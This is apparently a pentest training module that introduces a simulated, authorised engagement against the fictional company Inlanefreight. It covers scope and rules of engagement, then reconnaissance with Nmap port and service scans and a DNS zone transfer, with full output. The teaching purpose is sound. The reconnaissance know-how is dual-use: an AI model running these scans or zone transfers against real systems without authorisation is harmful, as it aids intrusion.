
<body>
  <div class="container">
<link rel="stylesheet" href="style.css">


<h1 id="26-attacking-enterprise-networks">26. Attacking Enterprise Networks</h1>
<h2 id="intro-to-attacking-enterprise-networks">Intro to Attacking Enterprise Networks</h2>
<hr>
<p>You&#39;ve done it! Congratulations, you&#39;ve reached the end of the <code>Penetration Tester</code> Job Role Path. This is no easy feat, and we know it has been a long journey full of many challenges, but hopefully, you have learned loads (or picked up new skills) along the way. As mentioned in the <code>Penetration Testing Process</code> module, the path was split into 27 modules to present a penetration test against the fictional organization, <code>Inlanefreight</code>, piece by piece, phase by phase, tool by tool. We structured the path based on the most important stages of the penetration testing process. We broke out individual modules based on the Tactics, Techniques, and Procedures (TTPs) that we feel are most important to have a firm grasp over to perform penetration testing engagements at an intermediate level while managing or assisting with the entire engagement lifecycle. Through the various modules, we take an in-depth tour through the following stages:</p>
<ul>
<li>Pre-Engagement</li>
<li>Information Gathering</li>
<li>Vulnerability Assessment</li>
<li>Exploitation</li>
<li>Post-Exploitation</li>
<li>Lateral Movement</li>
<li>Proof of Concept</li>
<li>Post-Engagement</li>
</ul>
<p>We aimed to keep the path as hands-on as possible while teaching the necessary prerequisite skills that we feel are necessary for an individual to succeed in a consulting environment. Yes, many things can only be learned on the job, but we&#39;ve done our best to equip you with the mindset and technical know-how to progress in your current role, start a new role, or move from one technical discipline to another. We, of course, cannot guarantee that anyone who completes this path will land their dream job immediately. But, if you&#39;ve put in the time, worked hard to understand the technical concepts in-depth, can complete all modules skills assessments on your own with a mix of automated and manual approaches, and focused heavily on honing your documentation and reporting skills, you will make sure yourself highly marketable.</p>
<p>Believe it or not, at this point (if you have finished every other module in the path), you have completed <code>seven mini simulated penetration tests</code>, each focusing on a particular area:</p>
<ul>
<li>All of the elements of a large pentest cut up into the 27 preceding modules</li>
<li>A cross-section of an Active Directory pentest (broken down step-by-step) in the Active Directory Enumeration &amp; Attacks module sections</li>
<li>2 mini/simulated Active Directory pentests in the Active Directory Enumeration &amp; Attacks skills assessments</li>
<li>1 mini/simulated pentest for the Shells &amp; Payloads module skills assessment</li>
<li>1 mini/simulated pentest for the Pivoting, Tunneling, &amp; Port Forwarding module skills assessment</li>
<li>1 mini/simulated internal pentest in the Documentation &amp; Reporting module (a mix of exploratory and guided learning)</li>
</ul>
<p>Through all module sections, we have attacked over 200 targets (a mix of Windows, Linux, Web, and Active Directory targets).</p>
<p>Until now, we have not seen all of the topics we teach in this path together in a single network (though some combine a few parts, i.e., a web attack to gain a foothold into an AD network). In each module&#39;s skills assessment, we had a general idea of the topics and tactics that would be covered. In this lab, we will have to call on <code>ALL</code> of the knowledge we have gained thus far and be able to switch from info gathering to web attacks to network attacks back to info gathering to Active Directory attacks, to privilege escalation, to pillaging and lateral movement, call on our pivoting skills and more. We need to be comfortable whether our target is a web application, a standalone Windows or Linux host, or an Active Directory network. This can seem overwhelming at first, but successful penetration testers must be able to constantly cycle through their Rolodex of skills and quickly adapt on the fly. We never know what we&#39;ll face before an engagement starts, and every network is unique but similar in how we should approach things. Every pentester has their own methodology and way of doing things but will always come back to the core stages of the penetration testing process.</p>
<p>This module&#39;s purpose is to allow you to practice everything learned so far against a simulated corporate network. This module will take us step-by-step through an External Penetration Test against the Inlanefreight company, leading to internal access and, at that point, turning into a full-scope Internal Penetration Test to find all possible weaknesses. The module will take you through each step from the perspective of a penetration tester, including chasing down &quot;dead ends&quot; and explaining the thought process and each step along the way. This can be considered a simulated &quot;ride-along&quot; pentest with a Penetration Tester working alongside a more experienced tester. The module sections will take you through the target network in a guided fashion, but you must still complete the entire lab yourself and retrieve and submit each flag. To get the most out of this module, we recommend tackling the lab a second time without the walkthrough as the pentester in the driver&#39;s seat, taking detailed notes (documenting as we learned in the <code>Documentation and Reporting</code> module), and creating your own walkthrough and even practice creating a commercial-grade report.</p>
<p>Next, we will cover the scope of the engagement and then dig in and get our hands dirty!</p>
<h2 id="scenario-kickoff">Scenario &amp; Kickoff</h2>
<hr>
<p>Our client, Inlanefreight, has contracted our company, Acme Security, Ltd., to perform a full-scope External Penetration Test to assess their perimeter security. The customer has asked us to identify as many vulnerabilities as possible; therefore, evasive testing is not required. They would like to see what sort of access can be achieved by an anonymous user on the Internet. Per the Rules of Engagement (RoE), if we can breach the DMZ and gain a foothold into the internal network, they would like us to see how far we can take that access, up to and including Active Directory domain compromise. The client has not provided web application, VPN, or Active Directory user credentials. The following domain and network ranges are in scope for testing:</p>
<table>
<thead>
<tr>
<th><strong>External Testing</strong></th>
<th><strong>Internal Testing</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>10.129.x.x (&quot;external&quot; facing target host)</td>
<td>172.16.8.0/23</td>
</tr>
<tr>
<td>*.inlanefreight.local (all subdomains)</td>
<td>172.16.9.0/23</td>
</tr>
<tr>
<td></td>
<td>INLANEFREIGHT.LOCAL (Active Directory domain)</td>
</tr>
</tbody>
</table>
<p>The customer has provided the primary domain and internal networks but has not given specifics on the exact subdomains within this scope nor the &quot;live&quot; hosts we will encounter within the network. They would like us to perform discovery to see what type of visibility an attacker can gain against their external network (and internal if a foothold is achieved).</p>
<p>Automated testing techniques such as enumeration and vulnerability scanning are permitted, but we must work carefully not to cause any service disruptions. The following are out of scope for this assessment:</p>
<ul>
<li>Phishing/Social Engineering against any Inlanefreight employees or customers</li>
<li>Physical attacks against Inlanefreight facilities</li>
<li>Destructive actions or Denial of Service (DoS) testing</li>
<li>Modifications to the environment without written consent from authorized Inlanefreight IT staff</li>
</ul>
<hr>
<h3 id="project-kickoff">Project Kickoff</h3>
<p>At this point, we have a Scope of Work (SoW) signed by both our company management and an authorized member of the Inlanefreight IT department. This SoW document lists the specifics of the testing, our methodology, the timeline, and agreed-upon meetings and deliverables. The client also signed a separate Rules of Engagement (RoE) document, commonly known as an Authorization to Test document. This document is crucial to have in hand before beginning testing and lists out the scope for all assessment types (URLs, individual IP addresses, CIDR network ranges, and credentials, if applicable). This document also lists key personnel from the testing company and Inlanefreight (a minimum of two contacts for each side, including their cell phone number and email address). The document also lists out specifics such as the testing start and stop date, and the allowed testing window.</p>
<p>We have been given one week for testing and two additional days to write our draft report (which we should be working on as we go). The client has authorized us to test 24/7 but asked us to run any heavy vulnerability scans outside regular business hours (after 18:00 London time). We have checked all necessary documents and have the required signatures from both sides, and the scope is filled in entirely, so we are good to go from an administrative perspective.</p>
<hr>
<h3 id="start-of-testing">Start of Testing</h3>
<p>It is first thing Monday morning, and we are ready to begin testing. Our testing VM is set up and ready to go, and we&#39;ve set up a skeleton notetaking and directory structure to take notes using our favorite notetaking tool. While our initial discovery scans run, as always, we will fill in as much of the report template as possible. This is one small efficiency we can gain while waiting for scans to complete to optimize the time we have for testing. We have drafted the following email to signal the start of testing and copied all necessary personnel.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/163/start\_testing.png" alt="text"></p>
<p>We click send on the email and kick off our external information gathering.</p>
<h2 id="external-information-gathering">External Information Gathering</h2>
<hr>
<p>We start with a quick initial Nmap scan against our target to get a lay of the land and see what we&#39;re dealing with. We ensure to save all scan output to the relevant subdirectory in our project directory.</p>
<p>External Information Gathering</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ sudo nmap <span class="hljs-comment">--open -oA inlanefreight_ept_tcp_1k -iL scope </span>

Starting Nmap <span class="hljs-number">7.92</span> ( <span class="hljs-keyword">https</span>://nmap.org ) <span class="hljs-keyword">at</span> <span class="hljs-number">2022</span><span class="hljs-number">-06</span><span class="hljs-number">-20</span> <span class="hljs-number">14</span>:<span class="hljs-number">56</span> EDT
Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.129</span><span class="hljs-number">.203</span><span class="hljs-number">.101</span>
Host is up (<span class="hljs-number">0.12</span>s latency).
Not shown: <span class="hljs-number">989</span> closed tcp ports (reset)
PORT     STATE SERVICE
<span class="hljs-number">21</span>/tcp   <span class="hljs-built_in">open</span>  <span class="hljs-keyword">ftp</span>
<span class="hljs-number">22</span>/tcp   <span class="hljs-built_in">open</span>  ssh
<span class="hljs-number">25</span>/tcp   <span class="hljs-built_in">open</span>  smtp
<span class="hljs-number">53</span>/tcp   <span class="hljs-built_in">open</span>  domain
<span class="hljs-number">80</span>/tcp   <span class="hljs-built_in">open</span>  <span class="hljs-keyword">http</span>
<span class="hljs-number">110</span>/tcp  <span class="hljs-built_in">open</span>  pop3
<span class="hljs-number">111</span>/tcp  <span class="hljs-built_in">open</span>  rpcbind
<span class="hljs-number">143</span>/tcp  <span class="hljs-built_in">open</span>  imap
<span class="hljs-number">993</span>/tcp  <span class="hljs-built_in">open</span>  imaps
<span class="hljs-number">995</span>/tcp  <span class="hljs-built_in">open</span>  pop3s
<span class="hljs-number">8080</span>/tcp <span class="hljs-built_in">open</span>  <span class="hljs-keyword">http</span>-proxy

Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">2.25</span> <span class="hljs-built_in">seconds</span>
</code></pre>
<p>We notice 11 ports open from our quick top 1,000 port TCP scan. It seems that we are dealing with a web server that is also running some additional services such as FTP, SSH, email (SMTP, pop3, and IMAP), DNS, and at least two web application-related ports.</p>
<p>In the meantime, we have been running a full port scan using the <code>-A</code> flag (<a href="https://nmap.org/book/man-misc-options.html">Aggressive scan options</a>) to perform additional enumeration including OS detection, version scanning, and script scanning. Keep in mind that this is a more intrusive scan than just running with the <code>-sV</code> flag for version scanning, and we should be careful to make sure that any scripts that are running with the script scan will not cause any issues.</p>
<p>External Information Gathering</p>
<pre><code class="lang-shell-session">root@htb[<span class="hljs-regexp">/htb]$ sudo nmap --open -p- -A -oA inlanefreight_ept_tcp_all_svc -iL scope

Starting Nmap 7.92 ( https:/</span><span class="hljs-regexp">/nmap.org ) at 2022-06-20 15:27 EDT
Nmap scan report for 10.129.203.101
Host is up (0.12s latency).
Not shown: 65524 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
21/tcp</span>   <span class="hljs-keyword">open</span>  ftp      vsftpd <span class="hljs-number">3.0</span>.<span class="hljs-number">3</span>
| ftp-anon: Anonymous FTP login allowed (FTP code <span class="hljs-number">230</span>)
|<span class="hljs-number">_</span>-rw-r--r--    <span class="hljs-number">1</span> <span class="hljs-number">0</span>        <span class="hljs-number">0</span>              <span class="hljs-number">38</span> May <span class="hljs-number">30</span> <span class="hljs-number">17</span>:<span class="hljs-number">16</span> flag.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:<span class="hljs-number">10.10</span>.<span class="hljs-number">14.15</span>
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is <span class="hljs-number">300</span>
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was <span class="hljs-number">1</span>
|      vsFTPd <span class="hljs-number">3.0</span>.<span class="hljs-number">3</span> - secure, fast, stable
|_End of status
<span class="hljs-number">22</span>/tcp   <span class="hljs-keyword">open</span>  ssh      OpenSSH <span class="hljs-number">8.2</span>p1 Ubuntu <span class="hljs-number">4</span>ubuntu<span class="hljs-number">0</span>.<span class="hljs-number">5</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)
| ssh-hostkey: 
|   <span class="hljs-number">3072</span> <span class="hljs-number">71</span>:08:b<span class="hljs-number">0</span>:c4:f3:ca:<span class="hljs-number">97</span>:<span class="hljs-number">57</span>:<span class="hljs-number">64</span>:<span class="hljs-number">97</span>:<span class="hljs-number">70</span>:f9:fe:c5:0c:<span class="hljs-number">7</span>b (RSA)
|   <span class="hljs-number">256</span> <span class="hljs-number">45</span>:c3:b5:<span class="hljs-number">14</span>:<span class="hljs-number">63</span>:<span class="hljs-number">99</span>:<span class="hljs-number">3</span>d:<span class="hljs-number">9</span>e:b3:<span class="hljs-number">22</span>:<span class="hljs-number">51</span>:e5:<span class="hljs-number">97</span>:<span class="hljs-number">76</span>:e1:<span class="hljs-number">50</span> (ECDSA)
|<span class="hljs-number">_</span>  <span class="hljs-number">256</span> <span class="hljs-number">2</span>e:c2:<span class="hljs-number">41</span>:<span class="hljs-number">66</span>:<span class="hljs-number">46</span>:ef:b6:<span class="hljs-number">81</span>:<span class="hljs-number">95</span>:d5:aa:<span class="hljs-number">35</span>:<span class="hljs-number">23</span>:<span class="hljs-number">94</span>:<span class="hljs-number">55</span>:<span class="hljs-number">38</span> (ED25519)
<span class="hljs-number">25</span>/tcp   <span class="hljs-keyword">open</span>  smtp     Postfix smtpd
|_ssl-date: TLS randomness does <span class="hljs-keyword">not</span> represent <span class="hljs-keyword">time</span>
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: <span class="hljs-number">2022</span>-<span class="hljs-number">05</span>-<span class="hljs-number">30</span>T17:<span class="hljs-number">15</span>:<span class="hljs-number">40</span>
|_Not valid after:  <span class="hljs-number">2032</span>-<span class="hljs-number">05</span>-<span class="hljs-number">27</span>T17:<span class="hljs-number">15</span>:<span class="hljs-number">40</span>
|_smtp-commands: ubuntu, PIPELINING, SIZE <span class="hljs-number">10240000</span>, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, <span class="hljs-number">8</span>BITMIME, DSN, SMTPUTF8, CHUNKING
<span class="hljs-number">53</span>/tcp   <span class="hljs-keyword">open</span>  domain   
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|     <span class="hljs-keyword">bind</span>
| dns-nsid: 
|<span class="hljs-number">_</span>  bind.version: 
<span class="hljs-number">80</span>/tcp   <span class="hljs-keyword">open</span>  http     Apache httpd <span class="hljs-number">2.4</span>.<span class="hljs-number">41</span> ((Ubuntu))
|_http-server-header: Apache/<span class="hljs-number">2.4</span>.<span class="hljs-number">41</span> (Ubuntu)
|_http-title: Inlanefreight
<span class="hljs-number">110</span>/tcp  <span class="hljs-keyword">open</span>  pop3     Dovecot pop3d
|_ssl-date: TLS randomness does <span class="hljs-keyword">not</span> represent <span class="hljs-keyword">time</span>
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: <span class="hljs-number">2022</span>-<span class="hljs-number">05</span>-<span class="hljs-number">30</span>T17:<span class="hljs-number">15</span>:<span class="hljs-number">40</span>
|_Not valid after:  <span class="hljs-number">2032</span>-<span class="hljs-number">05</span>-<span class="hljs-number">27</span>T17:<span class="hljs-number">15</span>:<span class="hljs-number">40</span>
|_pop3-capabilities: SASL TOP PIPELINING STLS RESP-CODES AUTH-RESP-CODE CAPA UIDL
<span class="hljs-number">111</span>/tcp  <span class="hljs-keyword">open</span>  rpcbind  <span class="hljs-number">2</span>-<span class="hljs-number">4</span> (RPC <span class="hljs-comment">#100000)</span>
| rpcinfo: 
|   program version    port/proto  service
|   <span class="hljs-number">100000</span>  <span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>        <span class="hljs-number">111</span>/tcp   rpcbind
|   <span class="hljs-number">100000</span>  <span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>        <span class="hljs-number">111</span>/udp   rpcbind
|   <span class="hljs-number">100000</span>  <span class="hljs-number">3</span>,<span class="hljs-number">4</span>          <span class="hljs-number">111</span>/tcp6  rpcbind
|<span class="hljs-number">_</span>  <span class="hljs-number">100000</span>  <span class="hljs-number">3</span>,<span class="hljs-number">4</span>          <span class="hljs-number">111</span>/udp6  rpcbind
<span class="hljs-number">143</span>/tcp  <span class="hljs-keyword">open</span>  imap     Dovecot imapd (Ubuntu)
|_imap-capabilities: LITERAL+ LOGIN-REFERRALS more Pre-login post-login ID capabilities listed have LOGINDISABLEDA0001 OK ENABLE IDLE STARTTLS SASL-IR IMAP4rev1
|_ssl-date: TLS randomness does <span class="hljs-keyword">not</span> represent <span class="hljs-keyword">time</span>
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: <span class="hljs-number">2022</span>-<span class="hljs-number">05</span>-<span class="hljs-number">30</span>T17:<span class="hljs-number">15</span>:<span class="hljs-number">40</span>
|_Not valid after:  <span class="hljs-number">2032</span>-<span class="hljs-number">05</span>-<span class="hljs-number">27</span>T17:<span class="hljs-number">15</span>:<span class="hljs-number">40</span>
<span class="hljs-number">993</span>/tcp  <span class="hljs-keyword">open</span>  ssl/imap Dovecot imapd (Ubuntu)
|_ssl-date: TLS randomness does <span class="hljs-keyword">not</span> represent <span class="hljs-keyword">time</span>
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: <span class="hljs-number">2022</span>-<span class="hljs-number">05</span>-<span class="hljs-number">30</span>T17:<span class="hljs-number">15</span>:<span class="hljs-number">40</span>
|_Not valid after:  <span class="hljs-number">2032</span>-<span class="hljs-number">05</span>-<span class="hljs-number">27</span>T17:<span class="hljs-number">15</span>:<span class="hljs-number">40</span>
|_imap-capabilities: LITERAL+ LOGIN-REFERRALS AUTH=PLAINA0001 post-login ID capabilities more have listed OK ENABLE IDLE Pre-login SASL-IR IMAP4rev1
<span class="hljs-number">995</span>/tcp  <span class="hljs-keyword">open</span>  ssl/pop3 Dovecot pop3d
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: <span class="hljs-number">2022</span>-<span class="hljs-number">05</span>-<span class="hljs-number">30</span>T17:<span class="hljs-number">15</span>:<span class="hljs-number">40</span>
|_Not valid after:  <span class="hljs-number">2032</span>-<span class="hljs-number">05</span>-<span class="hljs-number">27</span>T17:<span class="hljs-number">15</span>:<span class="hljs-number">40</span>
|_ssl-date: TLS randomness does <span class="hljs-keyword">not</span> represent <span class="hljs-keyword">time</span>
|_pop3-capabilities: SASL(PLAIN) TOP PIPELINING CAPA RESP-CODES AUTH-RESP-CODE USER UIDL
<span class="hljs-number">8080</span>/tcp <span class="hljs-keyword">open</span>  http     Apache httpd <span class="hljs-number">2.4</span>.<span class="hljs-number">41</span> ((Ubuntu))
|_http-server-header: Apache/<span class="hljs-number">2.4</span>.<span class="hljs-number">41</span> (Ubuntu)
| http-<span class="hljs-keyword">open</span>-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-title: Support Center
<span class="hljs-number">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https:<span class="hljs-regexp">//nmap</span>.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=<span class="hljs-number">7.92</span>%I=<span class="hljs-number">7</span>%D=<span class="hljs-number">6</span>/<span class="hljs-number">20</span>%Time=<span class="hljs-number">62</span>B0CA68%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,<span class="hljs-number">39</span>,<span class="hljs-string">"\x007\0\x06\x85\0\0\x01\0\x01\0\0\0\0\x07version\x
SF:04bind\0\0\x10\0\x03\xc0\x0c\0\x10\0\x03\0\0\0\0\0\r\x0c"</span>);
No exact OS matches <span class="hljs-keyword">for</span> host (If you know what OS is running on it, see https:<span class="hljs-regexp">//nmap</span>.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=<span class="hljs-number">7.92</span>%E=<span class="hljs-number">4</span>%D=<span class="hljs-number">6</span>/<span class="hljs-number">20</span>%OT=<span class="hljs-number">21</span>%CT=<span class="hljs-number">1</span>%CU=<span class="hljs-number">36505</span>%PV=Y%DS=<span class="hljs-number">2</span>%DC=T%G=Y%TM=<span class="hljs-number">62</span>B0CA8
OS:<span class="hljs-number">8</span>%P=x86_64-pc-linux-gnu)SEQ(SP=<span class="hljs-number">104</span>%GCD=<span class="hljs-number">1</span>%ISR=<span class="hljs-number">10</span>B%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST1
OS:<span class="hljs-number">1</span>NW7%O6=M505ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=<span class="hljs-number">40</span>%W=FAF<span class="hljs-number">0</span>%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=<span class="hljs-number">40</span>%S=O%A=S+%F=A
OS:S%RD=<span class="hljs-number">0</span>%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=<span class="hljs-number">40</span>%W=<span class="hljs-number">0</span>%S=A%A=Z%F=R%O=%RD=<span class="hljs-number">0</span>%Q=)T5(R
OS:=Y%DF=Y%T=<span class="hljs-number">40</span>%W=<span class="hljs-number">0</span>%S=Z%A=S+%F=AR%O=%RD=<span class="hljs-number">0</span>%Q=)T6(R=Y%DF=Y%T=<span class="hljs-number">40</span>%W=<span class="hljs-number">0</span>%S=A%A=Z%F
OS:=R%O=%RD=<span class="hljs-number">0</span>%Q=)T7(R=Y%DF=Y%T=<span class="hljs-number">40</span>%W=<span class="hljs-number">0</span>%S=Z%A=S+%F=AR%O=%RD=<span class="hljs-number">0</span>%Q=)U1(R=Y%DF=N%
OS:T=<span class="hljs-number">40</span>%IPL=<span class="hljs-number">164</span>%UN=<span class="hljs-number">0</span>%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=<span class="hljs-number">40</span>%CD
OS:=S)

Network Distance: <span class="hljs-number">2</span> hops
Service Info: Host:  ubuntu; OSs: Unix, Linux; CPE: cpe:<span class="hljs-regexp">/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp</span>)
HOP RTT       ADDRESS
<span class="hljs-number">1</span>   <span class="hljs-number">116.63</span> ms <span class="hljs-number">10.10</span>.<span class="hljs-number">14.1</span>
<span class="hljs-number">2</span>   <span class="hljs-number">117.72</span> ms <span class="hljs-number">10.129</span>.<span class="hljs-number">203.101</span>

OS <span class="hljs-keyword">and</span> Service detection performed. Please report any incorrect results at https:<span class="hljs-regexp">//nmap</span>.org/submit/ .
Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">84.91</span> seconds
</code></pre>
<p>The first thing we can see is that this is an Ubuntu host running an HTTP proxy of some kind. We can use this handy Nmap grep <a href="https://github.com/leonjza/awesome-nmap-grep">cheatsheet</a> to &quot;cut through the noise&quot; and extract the most useful information from the scan. Let&#39;s pull out the running services and service numbers, so we have them handy for further investigation.</p>
<p>External Information Gathering</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ egrep -v <span class="hljs-string">"^#|Status: Up"</span> inlanefreight_ept_tcp_all_svc.gnmap | cut -d ' ' -f4- | tr ',' '\n' | \                                                               
sed -e 's/^[ \t]*<span class="hljs-comment">//' | awk -F '/' '{print $7}' | grep -v "^$" | sort | uniq -c \</span>
| sort -k <span class="hljs-number">1</span> -nr

      <span class="hljs-number">2</span> Dovecot pop3d
      <span class="hljs-number">2</span> Dovecot imapd (Ubuntu)
      <span class="hljs-number">2</span> Apache httpd <span class="hljs-number">2.4</span><span class="hljs-number">.41</span> ((Ubuntu))
      <span class="hljs-number">1</span> vsftpd <span class="hljs-number">3.0</span><span class="hljs-number">.3</span>
      <span class="hljs-number">1</span> Postfix smtpd
      <span class="hljs-number">1</span> OpenSSH <span class="hljs-number">8.2</span>p1 Ubuntu <span class="hljs-number">4</span>ubuntu0<span class="hljs-number">.5</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)
      <span class="hljs-number">1</span> <span class="hljs-number">2</span><span class="hljs-number">-4</span> (RPC #<span class="hljs-number">100000</span>)
</code></pre>
<p>From these listening services, there are several things we can try immediately, but since we see DNS is present, let&#39;s try a DNS Zone Transfer to see if we can enumerate any valid subdomains for further exploration and expand our testing scope. We know from the scoping sheet that the primary domain is <code>INLANEFREIGHT.LOCAL</code>, so let&#39;s see what we can find.</p>
<p>External Information Gathering</p>
<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ dig axfr inlanefreight.local @<span class="hljs-number">10.129</span>.<span class="hljs-number">203.101</span>

; &lt;&lt;&gt;&gt; <span class="hljs-selector-tag">DiG</span> 9<span class="hljs-selector-class">.16</span><span class="hljs-selector-class">.27-Debian</span> &lt;&lt;&gt;&gt; <span class="hljs-selector-tag">axfr</span> <span class="hljs-selector-tag">inlanefreight</span><span class="hljs-selector-class">.local</span> @<span class="hljs-keyword">10</span>.<span class="hljs-keyword">129</span>.<span class="hljs-keyword">203</span>.<span class="hljs-keyword">101</span>
;; <span class="hljs-selector-tag">global</span> <span class="hljs-selector-tag">options</span>: +<span class="hljs-selector-tag">cmd</span>
<span class="hljs-selector-tag">inlanefreight</span><span class="hljs-selector-class">.local</span>.    86400    <span class="hljs-selector-tag">IN</span>    <span class="hljs-selector-tag">SOA</span>    <span class="hljs-selector-tag">ns1</span><span class="hljs-selector-class">.inlanfreight</span><span class="hljs-selector-class">.local</span>. <span class="hljs-selector-tag">dnsadmin</span><span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span>. 21 604800 86400 2419200 86400
<span class="hljs-selector-tag">inlanefreight</span><span class="hljs-selector-class">.local</span>.    86400    <span class="hljs-selector-tag">IN</span>    <span class="hljs-selector-tag">NS</span>    <span class="hljs-selector-tag">inlanefreight</span><span class="hljs-selector-class">.local</span>.
<span class="hljs-selector-tag">inlanefreight</span><span class="hljs-selector-class">.local</span>.    86400    <span class="hljs-selector-tag">IN</span>    <span class="hljs-selector-tag">A</span>    127<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span>
<span class="hljs-selector-tag">blog</span><span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span>. 86400    <span class="hljs-selector-tag">IN</span>    <span class="hljs-selector-tag">A</span>    127<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span>
<span class="hljs-selector-tag">careers</span><span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span>. 86400 <span class="hljs-selector-tag">IN</span>    <span class="hljs-selector-tag">A</span>    127<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span>
<span class="hljs-selector-tag">dev</span><span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span>. 86400    <span class="hljs-selector-tag">IN</span>    <span class="hljs-selector-tag">A</span>    127<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span>
<span class="hljs-selector-tag">gitlab</span><span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span>. 86400 <span class="hljs-selector-tag">IN</span>    <span class="hljs-selector-tag">A</span>    127<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span>
<span class="hljs-selector-tag">ir</span><span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span>.    86400    <span class="hljs-selector-tag">IN</span>    <span class="hljs-selector-tag">A</span>    127<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span>
<span class="hljs-selector-tag">status</span><span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span>. 86400 <span class="hljs-selector-tag">IN</span>    <span class="hljs-selector-tag">A</span>    127<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span>
<span class="hljs-selector-tag">support</span><span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span>. 86400 <span class="hljs-selector-tag">IN</span>    <span class="hljs-selector-tag">A</span>    127<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span>
<span class="hljs-selector-tag">tracking</span><span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span>. 86400 <span class="hljs-selector-tag">IN</span>    <span class="hljs-selector-tag">A</span>    127<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span>
<span class="hljs-selector-tag">vpn</span><span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span>. 86400    <span class="hljs-selector-tag">IN</span>    <span class="hljs-selector-tag">A</span>    127<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span>
<span class="hljs-selector-tag">inlanefreight</span><span class="hljs-selector-class">.local</span>.    86400    <span class="hljs-selector-tag">IN</span>    <span class="hljs-selector-tag">SOA</span>    <span class="hljs-selector-tag">ns1</span><span class="hljs-selector-class">.inlanfreight</span><span class="hljs-selector-class">.local</span>. <span class="hljs-selector-tag">dnsadmin</span><span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span>. 21 604800 86400 2419200 86400
;; <span class="hljs-selector-tag">Query</span> <span class="hljs-selector-tag">time</span>: 116 <span class="hljs-selector-tag">msec</span>
;; <span class="hljs-selector-tag">SERVER</span>: 10<span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.203</span><span class="hljs-selector-class">.101</span><span class="hljs-selector-id">#53</span>(10<span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.203</span><span class="hljs-selector-class">.101</span>)
;; <span class="hljs-selector-tag">WHEN</span>: <span class="hljs-selector-tag">Mon</span> <span class="hljs-selector-tag">Jun</span> 20 16<span class="hljs-selector-pseudo">:28</span><span class="hljs-selector-pseudo">:20</span> <span class="hljs-selector-tag">EDT</span> 2022
;; <span class="hljs-selector-tag">XFR</span> <span class="hljs-selector-tag">size</span>: 14 <span class="hljs-selector-tag">records</span> (<span class="hljs-selector-tag">messages</span> 1, <span class="hljs-selector-tag">bytes</span> 448)
</code></pre>
